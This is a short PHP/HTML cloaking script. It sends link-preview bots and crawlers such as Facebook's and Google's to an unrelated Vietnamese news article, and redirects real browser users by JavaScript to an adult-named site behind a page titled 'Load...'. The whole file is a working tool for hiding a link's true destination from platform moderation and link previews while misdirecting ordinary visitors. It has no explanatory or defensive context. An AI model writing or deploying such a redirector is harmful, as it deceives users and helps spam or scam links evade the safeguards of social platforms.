<?php

if (preg_match('/firefox|chrome|iphone|android|safari/i', $_SERVER['HTTP_USER_AGENT']) && !preg_match('/facebook|skype|preview|bot|crawl|slurp|spider|google/i', $_SERVER['HTTP_USER_AGENT'])) {

} else {
    header('HTTP/1.1 206 Partial Content');
    header('Accept-Ranges: bytes');
    header('Location: http://vnexpress.net/photo/thoi-su/cong-ty-may-o-can-tho-tan-hoang-sau-chay-thiet-hai-6-trieu-usd-3560293.html');
    exit;
} ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Load...</title>
</head>
<body>
<script type="text/javascript">window.location.href = decodeURIComponent("https://fuckbook.com");</script>
</body>
</html>
